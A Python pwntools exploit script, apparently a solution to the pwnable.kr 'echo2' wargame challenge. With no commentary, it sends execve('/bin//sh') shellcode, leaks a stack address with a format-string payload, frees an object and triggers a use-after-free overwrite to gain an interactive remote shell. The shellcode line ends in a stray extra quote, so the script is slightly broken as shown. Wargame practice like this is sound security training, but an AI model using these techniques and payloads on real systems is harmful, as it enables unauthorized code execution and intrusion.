from pwn import *
context.update(arch='amd64',os='linux')
REMOTE = True
shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05""
if REMOTE:
    r = remote("pwnable.kr",9011) 
else:
    r= process("./echo2")

def send_name():
    r.sendline(shellcode)

def leak_name_addr():
    r.recvuntil("> ").decode()
    r.sendline('2')
    r.recv()
    r.sendline(r"%10$p")
    leak = r.recvline().decode()
    print(leak)
    leak = int(leak,16)
    return leak

def free_o():
    r.recvuntil("> ")
    r.sendline('4')
    r.recvuntil("n)")
    r.sendline("n")

def uaf(name_addr):
    r.recvuntil("> ")
    r.sendline("3")
    payload = b"A" * 0x18
    payload += name_addr
    payload += name_addr
    r.sendline(payload)
    r.recv()
    r.interactive()

r.recvuntil(': ').decode()
send_name()
name_addr = p64(leak_name_addr()-0x20)
log.info(f"{name_addr=}\n\n")
free_o()
uaf(name_addr)